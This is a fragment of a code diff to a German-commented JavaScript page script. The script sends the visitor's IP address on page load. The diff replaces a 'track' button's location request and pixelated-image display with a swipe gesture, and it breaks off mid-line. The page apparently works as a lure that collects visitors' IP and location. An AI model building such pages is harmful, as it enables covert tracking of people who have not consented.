@@ -2,10 +2,8 @@ document.addEventListener("DOMContentLoaded", function() {
     sendIpAddress(); // IP-Adresse beim Laden der Seite senden
 });
 
-document.getElementById('trackBtn').addEventListener('click', function() {
-    getLocation();
-    showNewImages(false); // Zeigt verpixelte Bilder an, auch bei Fehlern
-});
+const trackBtn = document.getElementById('trackBtn');
+let startTouch = 0;
 
 // 📍 Standort abrufen
 function getLocation() {
@@ -106,3 +104,7 @@ function showNewImages() {
 
     document.getElementById("message").style.display = "block";
 }
+
+// 📱 Swipe-Geste hinzufügen
+trackBtn.addEventListener('touchstart', function(e) {
+    startTouch = e.touches[0].clientY; //
